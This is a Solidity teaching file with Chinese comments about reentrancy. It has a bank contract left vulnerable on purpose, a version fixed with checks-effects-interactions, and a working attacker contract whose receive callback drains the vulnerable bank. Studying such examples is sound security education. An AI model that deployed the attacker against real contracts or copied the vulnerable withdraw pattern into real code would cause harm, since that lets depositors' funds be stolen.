// SPDX-License-Identifier: MIT
pragma solidity ^0.8.36;

/// @notice 攻击合约和银行共同依赖的最小接口。
/// @dev 接口只声明 ABI，不包含状态变量或函数实现。
interface IWithdrawAllBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice 故意保留重入漏洞的反例，仅供本地学习，绝不能用于生产。
/// @dev 漏洞根因：向 msg.sender 转账后，才把其余额清零。
///
/// 业务模型：balances 代表银行欠每位储户的债务，而合约 ETH 是偿付这些债务的资产。
/// 正常情况下，支付一笔提款后必须立即消灭同一笔债权；本实现却允许回调期间重复消费债权，
/// 最终造成“真实资产为零、受害者账面余额仍存在”的资不抵债状态。
contract VulnerableBank is IWithdrawAllBank {
    error NothingToWithdraw();
    error TransferFailed();

    mapping(address account => uint256 amount) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        if (amount == 0) revert NothingToWithdraw();

        // Interaction 提前发生：接收方的 receive 可以在余额清零前再次调用 withdraw。
        (bool success,) = payable(msg.sender).call{value: amount}("");
        if (!success) revert TransferFailed();

        // 这一步太晚了。重入期间 balances[msg.sender] 仍然是原值。
        balances[msg.sender] = 0;
    }
}

/// @notice 使用 Checks-Effects-Interactions 修复同一类重入问题。
/// @dev 业务规则与 VulnerableBank 相同，但一笔债权在付款前就标记为已消费。
contract SafeBank is IWithdrawAllBank {
    error NothingToWithdraw();
    error TransferFailed();

    mapping(address account => uint256 amount) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        if (amount == 0) revert NothingToWithdraw();

        // Effects 先执行：即使接收方重入，也会因为余额为零而失败。
        balances[msg.sender] = 0;

        // Interaction 最后执行。若转账失败，revert 会恢复余额。
        (bool success,) = payable(msg.sender).call{value: amount}("");
        if (!success) revert TransferFailed();
    }
}

/// @notice 用 receive 回调反复重入目标银行的演示攻击合约。
/// @dev 攻击者只存入一份本金，却尝试重复兑现同一笔提款权，侵占其他储户资产。
contract ReentrancyAttacker {
    IWithdrawAllBank public immutable target;
    uint256 private withdrawalSize;

    constructor(IWithdrawAllBank target_) {
        target = target_;
    }

    /// @notice 用攻击本金存款，再触发第一次提款。
    function attack() external payable {
        withdrawalSize = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    /// @notice 每收到一次 ETH，若银行仍有足够余额，就再次提款。
    /// @dev 对 VulnerableBank 会递归成功；对 SafeBank 的第二次提款会回滚。
    receive() external payable {
        if (address(target).balance >= withdrawalSize) {
            target.withdraw();
        }
    }
}
